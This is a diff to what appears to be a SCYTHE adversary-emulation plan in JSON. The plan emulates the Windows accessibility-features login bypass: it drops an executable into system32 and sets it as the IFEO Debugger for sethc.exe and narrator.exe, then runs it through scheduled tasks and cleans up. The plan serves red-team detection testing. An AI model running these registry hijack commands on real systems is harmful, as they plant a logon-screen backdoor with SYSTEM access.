@@ -12,17 +12,22 @@
                 "type": "initialization"
             },
             "1": {
+                "name": "REQUIRES",
+                "type": "assign",
+                "value": "LOCAL ADMIN"
+            },
+            "2": {
                 "module": "loader",
                 "module_to_load": "run",
                 "request": "--load run",
                 "type": "message"
             },
-            "2": {
+            "3": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "Query for initial values"
             },
-            "3": {
+            "4": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"",
@@ -31,7 +36,7 @@
                 ],
                 "type": "message"
             },
-            "4": {
+            "5": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"",
@@ -40,7 +45,7 @@
                 ],
                 "type": "message"
             },
-            "5": {
+            "6": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\"",
@@ -49,27 +54,27 @@
                 ],
                 "type": "message"
             },
-            "6": {
+            "7": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "Now set the debugger values."
             },
-            "7": {
+            "8": {
                 "module": "loader",
                 "module_to_load": "downloader",
                 "request": "--load downloader",
                 "type": "message"
             },
-            "8": {
+            "9": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
-                "request": "--src VFS://shared/threats/Yanluowang-login-bypass/benign.exe --dest C:\\windows\\system32\\notmalware.exe",
+                "request": "--src VFS://shared/threats/common_x64/benign.exe --dest C:\\windows\\system32\\notmalware.exe",
                 "rtags": [
                     "att&ck-technique:T1204.002"
                 ],
                 "type": "message"
             },
-            "9": {
+            "10": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /d C:\\windows\\system32\\notmalware.exe /f",
@@ -79,7 +84,7 @@
                 ],
                 "type": "message"
             },
-            "10": {
+            "11": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\" /v Debugger /d C:\\windows\\system32\\notmalware.exe /f",
@@ -89,23 +94,23 @@
                 ],
                 "type": "message"
             },
-            "11": {
+            "12": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "Execute debuggers using IFEO"
             },
-            "12": {
+            "13": {
                 "module": "loader",
                 "module_to_load": "upsh",
                 "request": "--load upsh",
                 "type": "message"
             },
-            "13": {
+            "14": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "Do not signature against this scheduled task. It is there to kill the process and return control to the SCYTHE director."
             },
-            "14": {
+            "15": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
                 "request": "--cmd Invoke-Command -ScriptBlock {$time = [DateTime]::Now.AddMinutes(2); $hourMinute=$time.ToString(\"HH:mm\"); $action = New-ScheduledTaskAction -Execute 'taskkill' -Argument '/im notmalware.exe'; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -RunLevel Limited; $settings = New-ScheduledTaskSettingsSet; $settings.Hidden = 'False'; $trigger = New-ScheduledTaskTrigger -Once -At $hourMinute; $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings; Register-ScheduledTask -TaskName 'do_not_signature_SCYTHE' -InputObject $task -Force }",
@@ -114,7 +119,7 @@
                 ],
                 "type": "message"
             },
-            "15": {
+            "16": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "sethc.exe",
@@ -124,11 +129,11 @@
                 ],
                 "type": "message"
             },
-            "16": {
+            "17": {
                 "time": "240",
                 "type": "delay"
             },
-            "17": {
+            "18": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c del c:\\windows\\system32\\tasks\\do_not_signature_SCYTHE",
@@ -137,12 +142,12 @@
                 ],
                 "type": "message"
             },
-            "18": {
+            "19": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "Do not signature against this scheduled task. It is there to kill the process and return control to the SCYTHE director."
             },
-            "19": {
+            "20": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
                 "request": "--cmd Invoke-Command -ScriptBlock {$time = [DateTime]::Now.AddMinutes(2); $hourMinute=$time.ToString(\"HH:mm\"); $action = New-ScheduledTaskAction -Execute 'taskkill' -Argument '/im notmalware.exe'; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -RunLevel Limited; $settings = New-ScheduledTaskSettingsSet; $settings.Hidden = 'False'; $trigger = New-ScheduledTaskTrigger -Once -At $hourMinute; $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings; Register-ScheduledTask -TaskName 'do_not_signature_SCYTHE' -InputObject $task -Force }",
@@ -151,7 +156,7 @@
                 ],
                 "type": "message"
             },
-            "20": {
+            "21": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "narrator.exe",
@@ -161,11 +166,11 @@
                 ],
                 "type": "message"
             },
-            "21": {
+            "22": {
                 "time": "240",
                 "type": "delay"
             },
-            "22": {
+            "23": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c del c:\\windows\\system32\\tasks\\do_not_signature_SCYTHE",
@@ -174,12 +179,12 @@
                 ],
                 "type": "message"
             },
-            "23": {
+            "24": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "Cleanup"
             },
-            "24": {
+            "25": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /f",
@@ -188,15 +193,15 @@
                 ],
                 "type": "message"
             },
-            "25": {
+            "26": {
                 "function": "ifelse",
-                "next": "27",
-                "step": "4",
+                "next": "28",
+                "step": "5",
                 "type": "decision",
                 "value": "Incorrect function",
                 "verb": "does not contain"
             },
-            "26": {
+            "27": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /f",
@@ -205,7 +210,7 @@
                 ],
                 "type": "message"
             },
-            "27": {
+            "28": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\" /v Debugger /f",
@@ -214,15 +219,15 @@
                 ],
                 "type": "message"
             },
-            "28": {
+            "29": {
                 "function": "ifelse",
-                "next": "30",
-                "step": "5",
+                "next": "31",
+                "step": "6",
                 "type": "decision",
                 "value": "Incorrect function",
                 "verb": "does not contain"
             },
-            "29": {
+            "30": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\" /f",
@@ -231,7 +236,7 @@
                 ],
                 "type": "message"
             },
-            "30": {
+            "31": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c del C:\\windows\\system32\\notmalware.exe",
